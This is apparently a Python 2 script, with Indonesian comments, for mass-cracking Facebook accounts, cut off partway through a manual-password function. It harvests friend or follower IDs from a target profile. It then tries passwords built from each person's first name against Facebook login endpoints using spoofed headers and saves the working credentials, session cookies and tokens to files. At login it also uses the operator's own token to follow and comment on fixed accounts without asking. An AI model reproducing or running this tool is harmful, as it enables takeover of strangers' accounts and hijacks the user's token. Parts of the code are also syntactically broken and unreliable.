# -*- coding: utf-8
# Author by : ☆ ANGGA ☆ 
# Github    : Bajingan-Z
# Facebook  : Angga
# Instagram : raka_andrian27
# Twitter   : Bangsat_XD
# NOTE ...!!!
# JANGAN DI UBAH LAGI ANJING SCRIPT UDAH ENAK ...
# Meskipun Mau di Ubah IZIN DULU YA CUK ???
import os
try:
	import requests
except ImportError:
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	os.system("pip2 install bs4")

import os, sys, re, time, requests, json, random, calendar
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date

loop = 0
id = []
ok = []
cp = []

ct = datetime.now()
n = ct.month
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]


def  jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00.01)


my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tBilall = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

           
def raka_logo():
	os.system("clear")
	print("""\033[1;97m 
\033[1;91m$$\      $$\                           $$\           
\033[1;91m$$$\    $$$ |                          $$ |          
\033[1;92m$$$$\  $$$$ | $$$$$$\  $$$$$$$\   $$$$$$$ | $$$$$$\  
\033[1;96m$$\$$\$$ $$ | \____$$\ $$  __$$\ $$  __$$ | \____$$\ 
\033[1;96m$$ \$$$  $$ | $$$$$$$ |$$ |  $$ |$$ /  $$ | $$$$$$$ |
\033[1;93m$$ |\$  /$$ |$$  __$$ |$$ |  $$ |$$ |  $$ |$$  __$$ |
\033[1;94m$$ | \_/ $$ |\$$$$$$$ |$$ |  $$ |\$$$$$$$ |\$$$$$$$ |
\033[1;94m\__|     \__| \_______|\__|  \__| \_______| \_______|\n
\033[1;91m✥\033[1;96m\033[1;92m \033[1;96m═════════════════════════════════════════════━──⋆✥⋆➣
\033[1;93m⋆✥⋆➣\033[1;97m Author     : \033[1;92m☆ Angga \033[1;96m™ \033[1;92m☆ \033[1;97m
\033[1;93m⋆✥⋆➣\033[1;97m Github     : \033[1;92mhttps://github.com/Bajingan-Z \033[1;97m
\033[1;93m⋆✥⋆➣\033[1;97m Facebook   : \033[1;92mfb.me/PEMUDA.KALEUM \033[1;97m
\033[1;93m⋆✥⋆➣\033[1;97m Coded By   : \033[1;92mRaka \033[1;97m& \033[1;92mAngga \033[1;97m    """)
def login():
	os.system("clear")
	try:
		#-> connection test
		requests.get("https://mbasic.facebook.com")
	except requests.exceptions.ConnectionError:
		exit("Internet Connection Error")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		token = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m ☆LOGIN TOKEN☆ : \033[1;92m")
                jalan("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92m⋆✥⋆➣\033[1;97m Please Wait \033[1;92m... \033[1;97m");time.sleep(000.05)
                os.system("xdg-open https://youtu.be/bszAm4C5ovE")
		if token == "":
			print("Wrong Input")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			#-> bot follow
			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      
			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      
			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      
			requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token="+token)      
			requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)  
			requests.post("https://graph.facebook.com/953529338576547/comments?message=Raka Orang Terganteng diindonesia 😊 !&access_token="+token)
			requests.post("https://graph.facebook.com/4134622646575495/comments?message=Good Job 😊 !&access_token="+token)
			requests.post("https://graph.facebook.com/4257706904267068/comments?message=Raka Orang Terganteng diindonesia 😊 !&access_token="+token)
			menu()
		except KeyError:
			os.system("rm -f login.txt")
			exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m] \033[1;91mToken Expired\033[1;97m")

# Menu Raka Andrian Tara
def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m] \033[1;91mToken Expired\033[1;97m")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	except IOError:
		os.system("rm -f login.txt")
		exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m] \033[1;91mToken Expired\033[1;97m...")
	except requests.exceptions.ConnectionError:
		exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;91m No Internet Connection...!")

# Raka Logo
	raka_logo()
	ip = requests.get('https://api.ipify.org').text
        print("\033[1;96m\033[1;91m✥\033[1;96m\033[1;92m \033[1;96m═════════════════════════════════════════════━──⋆✥⋆➣")
        print("\033[1;96m\033[1;92m<<>>\033[1;96m\033[1;92m \033[1;97mNama       : \033[1;93m"+nama+"\033[1;92m")
        print("\033[1;96m\033[1;92m<<>>\033[1;96m\033[1;92m \033[1;97mIp Usert   : \033[1;93m%s"%(ip))
        print("\033[1;96m\033[1;92m<<>>\033[1;96m\033[1;92m \033[1;97mBergabung  : \033[1;93m%s"%(tgl))
        print("\033[1;96m\033[1;91m✥\033[1;96m\033[1;92m \033[1;96m═════════════════════════════════════════════━──⋆✥⋆➣\n")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m1\033[1;96m]\033[1;97m Crack Id Public")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m2\033[1;96m]\033[1;97m Crack Id Followers")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m3\033[1;96m]\033[1;97m Check Crack Results")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m4\033[1;96m]\033[1;97m User-Agent Settings")
        print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m5\033[1;96m]\033[1;97m Report A Bug")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m6\033[1;96m]\033[1;91m Remove Token")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m0\033[1;96m]\033[1;97m Exit\n")		
	Raka = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Option     : \033[1;92m")
	if Raka =="":
		menu()
	elif Raka == "1" or Raka == "01":
		publik()
		method()
	elif Raka == "2" or Raka == "02":
		follower()
		method()
	elif Raka == "3" or Raka == "03":
		print(" ")
		print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m1\033[1;96m]\033[1;97m Check Results RAKA_AMANDA OK")
		print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m2\033[1;96m]\033[1;97m Check Results RAKA_AMANDA CP")
		print(" ")
        elif Raka == "4" or Raka == "04":
                aa_raka()
                mathod()
	elif Raka == "5" or Raka == "05":
		print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Anda Akan Diarahkan Ke Messenger")
		time.sleep(00.01)
		os.system("xdg-open https://m.me/PEMUDA.KALEUM?text=Hallo%20Bang%20Ganteng")
		exit()
        elif Raka == "6" or Raka == "06":
                jalan('\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Delete Token....');time.sleep(1)
	        os.system("rm -f login.txt")
		exit()
        elif Raka == "0" or Raka == "00":
                jalan('\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Please Come Back...!');time.sleep(1)
		os.system('exit')
                exit(" ")
		cek = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Option  : \033[1;92m")
		if cek =="":
			menu()
		elif cek == "1":
			dirs = os.listdir("OK")
			print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Copy File Name  And Past Into Input")
			for file in dirs:
				print("[•]  "+file)
			try:
				file = raw_input("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m File Name : ")
				if file == "":
					menu()
				Totalok = open("OK/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print(" \033[1;94m # ----------------------------------------------")
			print(" Crack Resulte : %s Total : %s\033[0;92m"%(del_txt, len(Totalok)))
			os.system("cat OK/%s"%(file))
			print(" \033[0;94m # ----------------------------------------------")
			exit(" ")
		elif cek == "2":
			dirs = os.listdir("CP")
			print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Copy File Name And Past Into Input")
			for file in dirs:
				print(" + "+file)
			try:
				file = raw_input("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m File Name : ")
				if file == "":
					menu()
				Totalcp = open("CP/%s"%(file)).read().splitlines()
			except IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("\033[1;96m # ----------------------------------------------")
			print(" Crack results : %s total : %s\033[0;93m"%(del_txt, len(Totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;96m # ----------------------------------------------")
			exit(" ")
		menu()

def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;91m Token Expired\033[1;97m")
	idt = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Target Id  : \033[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("\033[1;92m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Total Id   : \033[0;92m%s\033[0;97m"%(len(id))) 

def follower():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m \033[1;91mToken Expired\033[1;97m")
	idt = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Target Id     : \033[1;92m")
	try:
		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["name"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	except KeyError:
		exit("\033[1;92m⋆✥⋆➣\033[1;97m Account Friend List Is Not Public")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Total Id    : \033[0;91m%s\033[0;97m"%(len(id))) 

def method():
        print("\n") 
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m1\033[1;96m] \033[1;97mB-Api\033[1;97m ( \033[1;95mCepat \033[1;97m)")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m2\033[1;96m] \033[1;97mM-Basic\033[1;97m ( \033[1;95mNormal \033[1;97m)")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m3\033[1;96m] \033[1;97mTouch Facebook\033[1;97m ( \033[1;95mSlow \033[1;97m)\n")
	method = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m] \033[1;97mOption     : \033[1;92m")
	if method == "":
		menu()
	elif method == "1":
		ask = raw_input("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Mau Menggunakan Passwords Manual ? y/t : \033[1;92m")
                print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Lama Ga Ada Hasil Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(bapi, id)
                print("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Simpan Hasil Crack Slama \033[1;92m5\033[1;97m Hari...")
		exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Crack Selesai...")
	elif method == "2":
		ask = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Mau Menggunakan Passwords Manual ? y/t : \033[1;92m")
                print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Lama Ga Ada Hasil Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mbasic, id)
                print("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Simpan Hasil Crack Slama \033[1;92m5\033[1;97m Hari...")
		exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Crack Selesai...")
	elif method == "3":
		ask = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Mau Mengunakan Passwords Manual ? y/t : \033[1;92m")
                print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Lama Ga Ada Hasil Mode Pesawat \033[1;92m1 \033[1;97mDetik ?")
		if ask == "y":
			manual()
		print(" ")
		ThreadPool(30).map(mobile, id)
                print("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Simpan Hasil CP Slama \033[1;92m5\033[1;97m Hari...")
		exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Crack Selesai...")
	else:
		menu()

def cek_ttl_cp(uid, pw):
	try:
		token = open("login.txt", "r").read()
		with requests.Session() as ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			month, day, year = ttl.split("/")
			month = bulan_ttl[month]
			print("\r\033[0;96m[RAKA_AMANDA] %s|%s|%s %s %s\033[0;96m"%(uid, pw, day, month, year))
			cp.append("%s|%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
	except KeyError, IOError:
		day = (" ")
		month = (" ")
		year = (" ")
	except:pass

def bapi(user):
	try:
		ua = open(".ua", "r").read()
                ua = random.choice()
	except IOError:
                ua = ("Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/10.0.001; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML,like Gecko) BrowserNG/7.1.17125")
                ua = ("BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103")
                ua = ("BlackBerry7130e/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/104")
                ua = ("Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30;]")
                ua = ("Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36;]")
                ua = ("Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36;]")
                ua = ("Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36;]")
                ua = ("Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36;]")
                ua = ("Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36;]")
                ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
                ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
                ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420;]")
	global loop, token
	sys.stdout.write(
		"\r\033[1;97m[\033[1;92mR\033[1;97m] \033[0;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"1", name+"12", name+"123" ]
	elif len(name)<=2:
		pwx = [ name+"3", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"2", name+"12", name+"123" ]
	else:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	try:
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;92m[RAKA_AMANDA] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mbasic(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;], Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
	global loop, token
	sys.stdout.write(
		"\r\033[1;97m[\033[1;92mR\033[0;97m]  \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[RAKA_AMANDA] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def mobile(user):
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
                ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
                ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
	global loop, token
	sys.stdout.write(
		"\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345" ]
	else:
		pwx = [ name+"123", name+"12345" ]
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[RAKA_AMANDA] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\033[0;96m[RAKA_AMANDA] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue

		loop += 1
	except:
		pass

def manual():
	try:
		ua = open(".ua", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
                ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
                ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
	global loop, token
	print("\n\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Type,For 2nd Password For Example : 112233,334455,445566,223344 etc")
	asu = raw_input("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Enter Passwords : ").split(",")
	if len(asu) =="":
		exit("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Wrong Input")
	print("\033[1;92m⋆✥⋆➣\033[1;96m[\033[1;93m•\033[1;96m]\033[1;97m Enter 2-4 Passwords For Fast Cracking Speed\n")

	def main(user):
		global loop, token
		sys.stdout.write(
		        "\r\033[1;97m[\033[1;92mR\033[0;97m] \033[1;92mCrack \033[0;93m-\033[0;96m %s/%s  \033[0;92m[OK:-%s] \033[0;93m- \033[0;96m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		try:
			for pw in asu:
				kwargs = {}
				pw = pw.lower()
				ses = requests.Session()
